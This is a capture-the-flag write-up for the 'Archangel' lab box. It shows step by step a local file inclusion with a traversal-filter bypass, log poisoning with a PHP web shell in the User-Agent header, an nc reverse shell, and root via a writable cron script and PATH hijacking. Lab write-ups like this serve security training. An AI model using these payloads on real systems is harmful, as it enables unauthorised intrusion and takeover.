# - ANGELARCH WRITEUP- #

1. Find Hostname (mail link) = mafialive.thm
    - Change Host file (`sudo nano /etc/hosts`)
    - add - IP hostname

2. Go to http://mafialive.thm for flag
    - Go to robots.txt
    - find **flag 1** + test.php

3. test.php LFI with wrapper:
    - php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/test.php
4. take base64 output and decode to see php code - **flag 2**
> PHP code detects ../.. but if you use .././.. it does the same thing but it is different

5. Use this to see logs
    - http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././../var/log/apache2/access.log

6. LFI log poisioning

- Open BurpSuite
- Open BurpSuite Browser and send request to /text.php
- Go to HTTP History, right click and send to repeater
- Send shell :
     ```
    GET / HTTP/1.1
    Host: mafialive.thm
    Upgrade-Insecure-Requests: 1
    User-Agent: <?php shell_exec($_GET['cmd']); ?>
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    ```

7. Go to website and visit mafialive.thm/test.php?cmd=
8. make reverse shell at https://www.revshells.com/
    - `rm /tmp/p;mkfifo /tmp/p;nc IP PORT 0</tmp/p|/bin/sh > /tmp/p 2>&1;rm /tmp/p`
    - encode into URL (https://meyerweb.com/eric/tools/dencoder/ OR in console encodeURIComponent('text'))

9. terminal = `nc -lvnp 1234`
10. Visit this website
    - http://mafialive.thm/test.php?cmd= ENCODED TEXT &view=/var/www/html/development_testing/.././.././.././.././.././../var/log/apache2/access.log

**You have reverse shell**
> make shell nice = `python3 -c "import pty;pty.spawn('bash')"`

11. `find / -perm /6000 -type f -executable 2>/dev/null`
    - see that crontab is on here


12. `cat etc/crontab`
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

13. we see that every minute archangel runs /helloworld
    - `cd /opt`
    - `ls-la (shows us we can write to it)`
```
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

14. `cat helloworld.sh`
```
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```
15. `echo "rm /tmp/p;mkfifo /tmp/p;nc IP PORT 0</tmp/p|/bin/sh > /tmp/p 2>&1;rm /tmp/p" > hellowworld.sh`
    - creating a reverse shell for user angel
16. `cd secret and cat user2.txt`

17. `echo $PATH`
    - /home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
18. `echo "/bin/bash" > cp`
19. `chmod +x cp`
20. `export PATH=$PWD:$PATH`
21. `./backup`

**WE GOT ROOT**
